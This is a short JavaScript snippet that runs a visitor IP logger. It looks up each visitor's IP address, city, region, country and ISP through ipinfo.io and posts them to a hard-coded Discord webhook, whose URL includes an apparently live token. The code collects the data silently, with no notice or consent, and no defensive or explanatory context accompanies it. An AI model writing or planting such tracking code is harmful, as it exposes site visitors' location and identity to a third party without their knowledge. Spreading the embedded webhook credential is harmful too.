fetch("https://ipinfo.io/json")
  .then(res => res.json())
  .then(data => {
    fetch("https://discord.com/api/webhooks/1359895770555224175/9x4FOaqCX7Xvbh7O-KZinxsO-SA-sMgEwXhllZiKFQ7NPAaCm9X5jzGYcsbyEcvorBJD", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        content: `**New Visitor on Website**\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nISP: ${data.org}\n...\n...`
      })
    });
  });
